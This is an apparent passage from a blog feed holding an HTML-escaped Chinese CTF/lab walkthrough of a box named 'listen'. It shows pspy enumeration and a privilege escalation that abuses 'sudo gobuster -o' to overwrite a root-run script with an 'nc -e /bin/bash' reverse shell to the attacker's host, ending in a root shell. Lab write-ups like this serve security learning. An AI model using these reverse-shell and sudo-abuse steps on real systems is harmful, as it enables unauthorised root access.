+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Length: &lt;span class=&#34;m&#34;&gt;3104768&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3.0M&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;application/octet-stream&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Saving to: ‘/tmp/pspy64’
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/tmp/pspy64                  100%&lt;span class=&#34;o&#34;&gt;[==============================================&lt;/span&gt;&amp;gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   2.96M  --.-KB/s    in 0.02s   
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2025-12-01 05:25:29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;187&lt;/span&gt; MB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; - ‘/tmp/pspy64’ saved &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;3104768/3104768&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:/$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; tmp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:/tmp$ chmod +x pspy64
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:/tmp$ ./pspy64
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     ██▓███    ██████  ██▓███ ▓██   ██▓
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                   ░           ░ ░     
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                               ░ ░     
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Config: Printing events &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;colored&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: &lt;span class=&#34;nv&#34;&gt;processes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; file-system-events&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Scanning &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; processes every 100ms and on inotify events &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Watching directories: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/usr /tmp /etc /home /var /opt&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;recursive&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;non-recursive&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Draining file system events due to startup...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:/tmp$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /opt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:/opt$ ls -al
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;total &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rwx------  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root    &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 06:54 .test.sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后在攻击机拼接目录 /tmp/b ,在靶机的tmp下创建a文件为字典写入/tmp/b,在b文件里写入shell并用gobuster写入.test.sh&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:/tmp$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp/b&amp;#39;&lt;/span&gt; &amp;gt;a.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:/tmp$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;nc -e /bin/bash 10.0.2.15 1234&amp;#39;&lt;/span&gt; &amp;gt;b
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:/tmp$ chmod +x b
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;攻击机创建以下目录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──(root㉿kali)-[~]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# cd tmp                                                                                                               
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──(root㉿kali)-[~/tmp]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# ls
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;b
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;执行命令&lt;code&gt;sudo gobuster -w a.txt -u http://10.0.2.15:80 -n -q -o /opt/.test.sh&lt;/code&gt;，攻击机监听1234获得root的shell&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#靶机&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:/tmp$ sudo gobuster -w a.txt -u http://10.0.2.15:80 -n -q -o /opt/.test.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/tmp/b
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#攻击机&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/tmp&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# nc -lnvp &lt;span class=&#34;m&#34;&gt;1234&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1234&lt;/span&gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.0.2.15&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.0.2.11&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;57002&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;id
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/script -qc /bin/bash /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@listen:~# &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; root
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; root
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash: cd: root: No such file or directory
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@listen:~# ls -al
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -al
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;total &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwx------  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lrwxrwxrwx  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root    &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; .bash_history -&amp;gt; /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;570&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2010&lt;/span&gt; .bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; .local
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lrwxrwxrwx  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root    &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; .mysql_history -&amp;gt; /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;148&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; note.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;148&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; .profile
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-------  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; R00t_fl4g_is_HHHHerererererrererere.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;66&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; .selected_editor
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@listen:~# 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;获得root.txt&lt;/p&gt;
 </description>
         </item>
         <item>
